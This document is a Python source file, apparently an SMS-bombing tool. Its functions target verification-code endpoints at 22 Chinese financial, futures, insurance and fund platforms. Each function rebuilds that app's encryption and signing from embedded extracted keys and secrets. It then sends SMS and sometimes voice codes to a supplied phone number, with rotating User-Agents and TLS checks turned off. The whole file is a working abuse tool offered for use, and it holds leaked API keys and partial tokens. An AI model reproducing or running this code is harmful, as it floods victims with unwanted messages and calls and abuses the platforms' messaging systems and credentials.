# sms_list_new.py
import requests
import json
import base64
import hashlib
import time
import random
import hmac
import uuid
import os
import binascii
from urllib.parse import quote
from Crypto.Cipher import AES, DES, DES3, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
import urllib3

urllib3.disable_warnings()

# ============ 工具函数 ============

def random_user_agent():
    devices = ["SM-G9910", "SM-G9980", "iPhone14,3", "iPhone15,3", "Mi 12", "OPD2404", "RMX2202"]
    android_ver = random.choice(["10", "11", "12", "13", "14", "15"])
    chrome_ver = random.choice(["120.0.6099.109", "125.0.6422.78", "130.0.6723.58", "133.0.6725.153"])
    wechat_ver = random.choice(["8.0.50", "8.0.55", "8.0.61"])
    hex_code = random.choice(["0x28003D34", "0x28003D35", "0x28003D36"])
    
    return (f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(devices)}) "
            f"AppleWebKit/537.36 Chrome/{chrome_ver} Mobile Safari/537.36 "
            f"MicroMessenger/{wechat_ver}({hex_code})")

def make_request(url, method="GET", **kwargs):
    """通用请求封装"""
    try:
        headers = kwargs.pop('headers', {})
        headers.setdefault('User-Agent', random_user_agent())
        
        if method.upper() == "GET":
            resp = requests.get(url, headers=headers, timeout=3, verify=False, **kwargs)
        else:
            resp = requests.post(url, headers=headers, timeout=3, verify=False, **kwargs)
        return resp.status_code == 200
    except Exception as e:
        return False

# ============ RSA加密工具 ============

def rsa_encrypt_pkcs1(plaintext, public_key_b64):
    """RSA/PKCS1v1.5加密"""
    try:
        key_bytes = base64.b64decode(public_key_b64)
        rsa_key = RSA.import_key(key_bytes)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(plaintext.encode('utf-8'))
        return base64.b64encode(encrypted).decode('utf-8')
    except:
        return None

# ============ 各平台接口 ============

# --- 中梁期货 ---
def zhongliang_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCoZuhgxGl8g0N7O5AvCFkW8Z/8u7Wrv1QMuNLX/NCMAE3NxfG1/9l1Ql5w2C8KqHxKI/bmpQPDBn4Wsa8qShvYO2fJwKKa7OoM5IzkNkbbxTXxKiECtSrbj9zOowEV6QaqkUtyg3c6pbpyrjHG71QwvxVv2G4sTsnjLdIQZpIyYwIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    return make_request(API_URL, "POST", data={
        'encryptMobile': encrypted,
        'qsId': "750"
    }, headers={
        'Host': "ftoem.10jqka.com.cn:9443",
        'User-Agent': "GZhongLiang_Futures/ (Royal Flush) hxtheme/0",
        'Content-Type': 'application/x-www-form-urlencoded'
    })

# --- 厦门融达 ---
def xiamen_rongda(phone):
    API_URL = "https://rdapp.xmrd.net/gateway/security/code/direct/sms"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmMiLb4dfBkI/alsBJtnAVZZnEGWxPQE0FR2mVtJ4nIFeZ/UyOhjUfTL4N5QWzorkniI8jifvbKARP8f5s3uuVxipkZkjHBytBj7VNv3K8H4LXaP6Jn3fhyULHo1CDnyrXuq9qwuj15ooljcE172JALQ7hfdre1MvPCImFrKw8Vaf/7X1Bsh38Q/J21R+gWkTodhG4QJFs5K5ZDbf2GHueE2HtPKaAQ35cNz8e/6SxUjUFwts8BNPknqUkn5tbcPVIzHCq43xz9iFUglI80XLLe54DnkB967pbweq8lx9qn14dE9L24GexgloMQRvaTtmBvpJ2yVou159lGDBJl+WYwIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    time.sleep(1)  # 防高频
    return make_request(API_URL, "POST", json={"phone": encrypted}, headers={
        'User-Agent': "okhttp/5.0.0-alpha.11",
        'x-id-token': "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
        'x-platform': "android",
        'Content-Type': "application/json"
    })

# --- 平安期货 ---
def pingan_futures(phone):
    API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/pinganOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7yRhpJe7xf2th+9O1cmBCE+3OrB+hNZfuax6rTJ7if0uqGsFkfDRYJCldm4OXE+WjPLJQaG9DlCjMCB/SQFwa/dihzdgaV27Kpdq2FR/Uat1L+WQ+xwik5AhMKT5LnL0Iw9rNpXPzAxBBnfAhrc3PsTbBwTE4oaQeWC6dDMB/4IBB+C3w2cClW3Ut6E/qPydQwbYRtNWc4XZBLGJKrurWwdLRYKDWbF8SeKvvnyQipATRJ7D+JocvOY+EP6FiUAA0kGFG+4/P0vQNCaRexZFKQKjHKGR5nunJnmJtsjar/nix7VZyenWjEfnPkf7IwxZIZqpCOJb8JBfozRztHMDiwIDAQAB"
    
    pem_key = f"-----BEGIN PUBLIC KEY-----\n{RSA_KEY}\n-----END PUBLIC KEY-----"
    try:
        rsa_key = RSA.importKey(pem_key)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = base64.b64encode(cipher.encrypt(phone.encode())).decode()
    except:
        return False
    
    return make_request(API_URL, "POST", data={
        'encryptMobile': encrypted,
        'qsId': "734"
    }, headers={
        'Host': "ftoem.10jqka.com.cn:9443",
        'User-Agent': "GPingA_Futures/2.0.4",
        'Cookie': "user=MDptdF9veTdtOWxnN2o6Ok5vbmU6NTAwOjgyNjUzMjI2MTo3..."
    })

# --- 中民保险 ---
def zhongmin_insurance(phone):
    API_URL = "https://interface.insurance-china.com/SendCode_SMS"
    SECRET = "zhongmin_zm123"
    sign = hashlib.md5((phone + SECRET).encode()).hexdigest()
    
    return make_request(API_URL, "GET", params={
        'phone': phone,
        'type': 3,
        'sign': sign
    }, headers={
        'User-Agent': "zbt_Android",
        'Authorization': AUTH_BEARER[:50] + "..."
    })

# --- 驰度数据 ---
def chidu_data(phone):
    API_URL = "https://api.chidudata.com/API/index.php/api/login/sendCode"
    KEY = "2E2J4x0XKBs6PgTbq2BaMyFrE0OxadXP"
    timestamp = str(int(time.time() * 1000))
    sign = hashlib.md5(f"phone={phone}&timestamp={timestamp}&key={KEY}".encode()).hexdigest().upper()
    
    return make_request(API_URL, "POST", data={
        'timestamp': timestamp,
        'phone': phone,
        'sign': sign
    }, headers={
        'version': "250623",
        'appID': "1",
        'platform': "android"
    })

# --- 广科贷 ---
def guangkedai(phone):
    API_URL = "https://uoil.gkoudai.com/UserWebServer/sms/sendPhoneCode"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsfEjWk0jIPOqrfD943VzyGN0Z8SD3B1Fb8gL67bNo+epQaE6TqlP3j7exFdNdfgGwmFe/uX2m3HfDjjxShC8O5E3iuBwk8HECHO6+FeNZfhlJQqJ53YK39K2u1Bjuv325ZJllYea4NeqkrX4WkbSX7igys05Ziof9tmR2dQTcCwIDAQAB"
    
    # RSA加密x参数
    plain = f"phone={phone}&type=register&encript_key=RQACYEZPWMANBOLNXFZPUCMC&"
    encrypted_x = rsa_encrypt_pkcs1(plain, RSA_KEY)
    if not encrypted_x: return False
    
    # MD5签名
    timestamp = str(int(time.time() * 1000))
    sign_content = f"sojex/3.9.7sms/sendPhoneCode{timestamp}gkoudaiAndroid3.9.7OnePlus_OP5D77L15526493830958OPD2404_15.0.0.601%28CN01%29OPD2404_ANDROID_15"
    sign = hashlib.md5(sign_content.encode()).hexdigest()
    
    return make_request(API_URL, "POST", data={'x': encrypted_x}, headers={
        'User-Agent': "sojex/3.9.7(Anroid;15;2958*2120)",
        'time': timestamp,
        'sign': sign
    })

# --- 财之道 ---
def caizhidao(phone):
    API_URL = "https://ngssa.caizidao.com.cn/ngssa/api/auth/sms/v1/send"
    KEY = bytes.fromhex("4d6b6753484b4f594370346a374f614c2b426b42384f6455")
    IV = bytes.fromhex("65577734616e706b5a54423662336335")
    
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    # 短信
    sms_ok = make_request(API_URL, "POST", data=json.dumps({"mobile": encrypted, "type": "0"}), headers={
        'User-Agent': "okhttp/4.9.0",
        'x-device-id': "9938ba09309274d5e802bc4ad97ce979b",
        'Content-Type': "application/json; charset=utf-8"
    })
    
    time.sleep(6)
    
    # 语音
    voice_ok = make_request(API_URL, "POST", data=json.dumps({"mobile": encrypted, "receiveType": "voice"}), headers={
        'User-Agent': "okhttp/4.9.0",
        'x-device-id': "9938ba09309274d5e802bc4ad97ce979b",
        'Content-Type': "application/json; charset=utf-8"
    })
    
    return sms_ok or voice_ok

# --- 方正期货 ---
def founder_futures(phone):
    API_URL = "https://qhapi.founderfu.com:11443"
    KEY = bytes.fromhex("3965594b4b36793138496e6756345141")
    IV = bytes.fromhex("3965594b4b36793138496e6756345141")
    
    business = {
        "market": "oppo", "brokerId": "0007", "f": "fzqh", "v": "1",
        "h": "sendCode", "mobile": phone, "channel": "oppo",
        "appkey": "100241", "version": "1.3.7", "platform": "1"
    }
    
    try:
        json_str = json.dumps(business, separators=(',', ':'))
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(json_str.encode("utf-8"), AES.block_size, style="pkcs7")
        encryptdata = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    # 这里需要动态获取server_dd和sign，简化处理
    return make_request(API_URL, "POST", data={
        't': "2025-10-27 07:16:30",
        'sign': "63352d64c6916beefe68556e27501f07",
        'encryptdata': encryptdata
    }, headers={'User-Agent': "okhttp-okgo/jeasonlzy"})

# --- Talicai ---
def talicai(phone):
    API_URL = "https://www.talicai.com/api/v1/accounts/sms"
    SECRET = "f09d5cd3!0390409e#98e6544dd16645%20"
    timestamp = int(time.time() * 1000)
    sign = hashlib.md5(f"mobile={phone}|sms_type=1|timestamp={timestamp}|type=4{SECRET}".encode()).hexdigest()
    
    return make_request(API_URL, "POST", data=json.dumps({
        "mobile": phone, "sign": sign, "sms_type": 1, "timestamp": timestamp, "type": 4
    }), headers={
        'User-Agent': "Talicai/6.23.2(Android)",
        'x-client-id': "aEN4LpN88LHcV1UCbnMMFtiu3dvHI2",
        'Content-Type': "application/json"
    })

# --- HRHG Stock ---
def hrhg_stock(phone):
    url = "https://cms.hrhgstock.com/api/userNew/sendCode"
    KEY = "41594d74363448486b76435a734546787273337143773d3d"
    
    try:
        key_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_ECB)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    return make_request(url, "POST", data=json.dumps({"phone": encrypted, "type": 1}), headers={
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json; charset=UTF-8",
        'Cookie': "acw_tc=0a45644e17615034794703872ed0973aeb3bb93c217095a944a459a562274c"
    })

# --- ChinaHGC ---
def chinahgc(phone):
    url = "https://czd.chinahgc.com/uaa/oauth/sms-code"
    KEY = "4c696e4c6f6e674576656e7432303231"
    
    try:
        key_bytes = bytes.fromhex(KEY)
        iv_bytes = bytes.fromhex(KEY)
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded = pad(phone.encode("ascii"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    return make_request(url, "POST", data=json.dumps({"mobile": encrypted, "type": "auth"}), headers={
        'User-Agent': random_user_agent(),
        'crypt-version': "1",
        'x-device-id': "22e66cf4021a830519f6e495e5a06b328",
        'Content-Type': "application/json"
    })

# --- 东方财富 ---
def eastmoney(phone):
    url = "https://wgkhapihdmix.18.cn/api/RegistV2/VerificationCode"
    KEY = "6561737461626364"
    IV = "6561737461626364"
    
    try:
        cipher = DES.new(bytes.fromhex(KEY), DES.MODE_CBC, bytes.fromhex(IV))
        padded = pad(phone.encode("ascii"), DES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    sign = hashlib.md5(f"{phone}DFCFKH27".encode()).hexdigest()
    
    return make_request(url, "POST", data=json.dumps({
        "mobile": encrypted,
        "smsRndVcode": sign,
        "IsEncrypt": "10"
    }), headers={
        'User-Agent': "okhttp/3.12.13",
        'EM-OS': "Android",
        'EM-PKG': "com.eastmoney.android.gubaproj"
    })

# --- 蓝易科技 ---
def lanyi(phone):
    # 需要token，简化版
    return False  # 需要实现token获取逻辑

# --- Wogoo ---
def wogoo(phone):
    url = "https://www.wogoo.com/server/szfyOfficialWebsite/v2/sendMessage"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx6Cu1q/suUGyXQMALQoTY2kK2rybWdkeNLjhZPJZRjShXWoYWCdly04HxhQC3WV+fZOu64WYOwBQaoKnGX1Ten1lByVgo/u0q4vZwAj5axHwmMq7LkebWWeVC54DCfANUegL9nthXkoJJe0SsNflEinzjWSUwHjQkQeOBMq8wODXakvyJPwwb/PU29QPlKQfNxgM/44K4U1ZTvZUFgSYVtIx6/1W3by7FSoCr3Ik988ptbq1ruhPtxW7x1bjQbTLayLPD2CYDOL2/px+8hypMbXUXSmYcur5ulSLVhZ73btret7xz0gjFZCXePn7OR/6I9CtF/PztA229baXIwZE2wIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    return make_request(url, "POST", data={'PHONE': encrypted, 'type': "0"}, headers={
        'User-Agent': "okhttp-okgo/jeasonlzy",
        'X-White-List': "app4.0",
        'X-Tracking-ID': str(uuid.uuid4()).replace("-", "")[:32]
    })

# --- 博时基金 ---
def bosera(phone):
    url = "https://m.bosera.com/ftc_prd/matrix/auth/login/v1/sendVerifyCode"
    params = {
        "prefix": "bs_fd_cr", "update_version": "1109", "app_version": "8.7.8",
        "device_model": "OPD2404", "application_id": "bd0ef3d09dc8804f6ff82ae4983d50a5",
        "channel_id": "bsfund", "access_token": str(uuid.uuid4()),
        "device_id": f"ra_{random.randint(1000000000000, 9999999999999)}",
        "platform_type": "oppo", "build_version": "20251015095235"
    }
    
    sign_str = "".join([params[k] for k in sorted(params.keys()) if k != "access_token"]) + params["prefix"]
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    return make_request(url, "POST", data={
        **{k.replace("_", ""): v for k, v in params.items()},
        'signature': sign,
        'sysId': "1"
    }, headers={'knightToken': f"V5{str(uuid.uuid4())}"})

# --- ChinaHXZQ ---
def chinahxzq(phone):
    url_template = "https://app.chinahxzq.com.cn:9302/user/captcha?content={enc}"
    KEY = b'5eFhFgJiDwG68DZn'
    IV = b's6NOFsDdkfg3XiRm'
    
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded = pad(f'phone={phone}'.encode("utf-8"), AES.block_size, style="pkcs7")
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
        url_safe = encrypted.replace('+', '-').replace('/', '_').rstrip('=')
    except:
        return False
    
    return make_request(url_template.format(enc=url_safe), "GET", headers={
        'Host': 'app.chinahxzq.com.cn:9302',
        'User-Agent': 'okhttp/4.10.0'
    })

# --- 同花顺期货 ---
def tonghuashun(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/gtjaOauth/send"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3r6vWlyL7i0CbDvFn0G41Ch9zZX4eja9mhWShpH/Tjcar+KB2kFSab5dkxKCkcJek7WwKsvgL5a38qOVeq8NJVkbVD0iD5qT/E+4NOYtS/HEvB/mDOB+YAB4afjI6iwuTuTa4AztXO9zh0lSHDUbA5OMWR6aCP1bHGNJzLHEtLRSD9EE4C6OG9guws8kKKN4I7lGsbdXA705iOvF+SZkbriSf/OglOZSWUIZK6sZLYT7kqvxZeDxJkZxJDbKVEpEgtBdCNsSPZhAr538/Ecv4QnbfMV7YHeVIx/OFCfRyKoGJqglMy3Y3ZD6DGponboKubz4iib7mTYfgWwgF1qKQIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    timestamp = str(int(time.time()))
    sign = hashlib.md5(f"37dc6e6beb603a86{timestamp}".encode()).hexdigest()
    
    return make_request(url, "POST", data={
        'encryptMobile': encrypted,
        'platform': "Android",
        'uuid': "37dc6e6beb603a86",
        'appVersion': "3.2.6",
        'osVersion': "35",
        'model': "OPD2404",
        'sign': sign,
        'timestamp': timestamp
    })

# --- Romaway ---
def romaway(phone):
    time.sleep(5)  # 固定5秒延迟
    return make_request("https://webapi.zn.romaway.cn/sms/sendCodeByMobile", "POST",
        data=json.dumps({
            "userId": "01319bd2102982fcaddd74ea26f5b233",
            "guId": "01319bd2102982fcaddd74ea26f5b233",
            "businessSign": "financial_terminal",
            "mobile": phone
        }), headers={
            'User-Agent': "dzapp/",
            'Content-Type': "application/json",
            'origin': "https://webrw.zn.romaway.cn"
        })

# --- 普普基金 ---
def pupu_fund(phone):
    url = "https://wapp.ppwfund.com/v1/user/sendVerificationCode"
    SECRET = "AGAO57D4E5FY27H8I9J0G1I4"
    
    def des3_encrypt(text):
        key = SECRET.encode().ljust(24, b'\x00')
        cipher = DES3.new(key, DES3.MODE_ECB)
        padded = pad(text.encode(), DES3.block_size, style='pkcs7')
        return base64.b64encode(cipher.encrypt(padded)).decode()
    
    business = json.dumps({"code_length": "6", "phone": phone, "send_type": "13"}, separators=(',', ':'))
    data = des3_encrypt(business)
    timestamp = str(int(time.time()))
    nonce = str(uuid.uuid4()).replace("-", "").upper()
    
    sign_str = f"7.11.023{data}3c7ab5c8355a45493a0b9864d6411ce1{SECRET}{nonce}{timestamp}"
    sign = hashlib.md5(sign_str.encode()).hexdigest()
    
    return make_request(url, "POST", data={
        'app_install_version': "7.11.0", 'app_type': "23",
        'device_brand': "OnePlus", 'channel': "oppo",
        'device_os_version': "15", 'device_mode': "OPD2404",
        'device_type': "2", 'device_uuid': "3c7ab5c8355a45493a0b9864d6411ce1",
        'data': data, 'nonce': nonce, 'timestamp': timestamp, 'sign': sign
    })

# --- 中信建投 ---
def zhongxinjiantou(phone):
    url = "https://ftapi.10jqka.com.cn/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3YVAkvdYlilG3mgYdGxeJEVFHATB9JL2dZKkoRhb0Dy1TNMp/4Y4PRyv0zxdGHN5lLpJ9ik4AMNaWYUE9u1X9GjtOg4QX0jxDXLkTeWWX0dzeYUCTb3PmAhUE5ZtOtZMt+z6lOODfvcJGe2iCqEFN4JoSmL5aBC9jHMysskZQZQIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    return make_request(url, "POST", data={
        'encryptMobile': encrypted,
        'qsId': "569"
    }, headers={'User-Agent': "GZXJT_Futures/ (Royal Flush)"})

# --- 财之道双发 ---
def caizhidao_double(phone):
    url = "https://czdcosm-ssa.caizidao.com.cn/czdcosm-ssa/api/auth/sms/v1/send"
    KEY = "MkgSHKOYCp4j7OaL+BkB8OdU"
    IV = "eWw4anpkZTB6b3c5"
    
    try:
        cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV.encode())
        padded = pad(phone.encode(), AES.block_size, style='pkcs7')
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode()
    except:
        return False
    
    # 语音
    voice_ok = make_request(url, "POST", data=json.dumps({
        "mobile": encrypted, "receiveType": "voice"
    }), headers={'User-Agent': "okhttp/4.9.0"})
    
    time.sleep(3)
    
    # 短信
    sms_ok = make_request(url, "POST", data=json.dumps({
        "mobile": encrypted, "type": "0"
    }), headers={'User-Agent': "okhttp/4.9.0"})
    
    return voice_ok or sms_ok

# --- 选股宝 ---
def xuangubao(phone):
    # 需要HmacMD5，较复杂，简化
    return False

# --- 恒泰期货 ---
def hengtai(phone):
    url = "https://multiapp.hsqh.net:4443/user/service/key/qrcodeService/sendVerificationCode"
    RSA_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwVwJ12WGdZBJApmMgj0hNQWQzbHDuEoHHYJIavS1raCbIOgXAxBAyzRjasrkXefDY0qL2pwFKaijhOMY46c357BEd+tr6OuixZHw/GNms4Aytd4AQFhOoZw3LOO58GPq5SaAYZ16bHaCtmVHEf9eQUkAA5QMnd2+ZuykkGnE0mMS6asGJ3D0sedh0Q2fu64ekJqlfa/4BBKbljxzgNH4KbG6TcrTxSu56iGTUiQK/F76E4BnPtejdtDPbClf2qrXyY+YidMtliRnorrK1k7f3PYiU16124eist70D5QcIxCS983apg5wquoAz2OW6+C4xSHLADEUka+SpmLL9NgE/QIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    return make_request(url, "POST", data={
        'secretKey': "1", 'scene': "1", 'phone': encrypted
    }, headers={
        'user-app-version': "2.0.0",
        'bundle_id': "com.hsqh.futures"
    })

# --- 光大期货 ---
def guangda(phone):
    url = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
    RSA_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6s72YtZTNHvsf2rtS12SX3PcxFamWYqw0XYl4+w/kJ5v/IgZQ82+yQ/+NyQGWP28nIxCkznKQA/OI4ET9zp4nGq4lN5wcfpvkHyYu4Neo3seuIHsYb2xHDt5RHXTfXBE6hRtW8JxMTkqOI3CP9AQr4vUj66amz02k9gsulw6X/wIDAQAB"
    
    encrypted = rsa_encrypt_pkcs1(phone, RSA_KEY)
    if not encrypted: return False
    
    return make_request(url, "POST", data={
        'encryptMobile': encrypted,
        'qsId': "541"
    }, headers={'User-Agent': "GGuangDa_Futures/ (Royal Flush)"})

# ============ 平台注册表 ============

NEW_PLATFORMS = [
    ("中梁期货", zhongliang_futures),
    ("厦门融达", xiamen_rongda),
    ("平安期货", pingan_futures),
    ("中民保险", zhongmin_insurance),
    ("驰度数据", chidu_data),
    ("广科贷", guangkedai),
    ("财之道", caizhidao),
    ("方正期货", founder_futures),
    ("Talicai", talicai),
    ("HRHG", hrhg_stock),
    ("ChinaHGC", chinahgc),
    ("东方财富", eastmoney),
    ("Wogoo", wogoo),
    ("博时基金", bosera),
    ("ChinaHXZQ", chinahxzq),
    ("同花顺期货", tonghuashun),
    ("Romaway", romaway),
    ("普普基金", pupu_fund),
    ("中信建投", zhongxinjiantou),
    ("财之道双发", caizhidao_double),
    ("恒泰期货", hengtai),
    ("光大期货", guangda),
]
